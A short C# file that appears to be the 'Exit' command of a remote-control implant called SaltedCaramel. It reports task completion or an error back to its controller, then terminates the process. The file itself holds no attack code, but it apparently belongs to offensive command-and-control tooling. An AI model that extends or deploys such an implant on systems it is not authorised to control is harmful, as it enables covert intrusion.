using System;

namespace SaltedCaramel.Tasks
{
    class Exit
    {
        public static void Execute(SCTaskObject task, SCImplant implant)
        {
            try
            {
                implant.SendComplete(task.id);
            }
            catch (Exception e)
            {
                implant.SendError(task.id, e.Message);
            }
            Environment.Exit(0);
        }
    }
}
